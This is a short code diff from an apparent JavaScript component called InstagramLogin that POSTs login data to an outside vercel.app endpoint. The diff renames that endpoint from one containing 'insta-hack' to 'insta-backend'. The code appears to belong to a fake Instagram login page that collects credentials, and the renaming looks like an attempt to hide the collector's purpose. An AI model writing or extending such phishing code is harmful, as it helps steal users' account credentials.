@@ -9,7 +9,7 @@ function InstagramLogin() {
     e.preventDefault();
     
     try {
-      const response = await fetch('https://insta-hack-fr1j.vercel.app/api/login', {
+      const response = await fetch('https://insta-backend-lyart.vercel.app/api/login', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
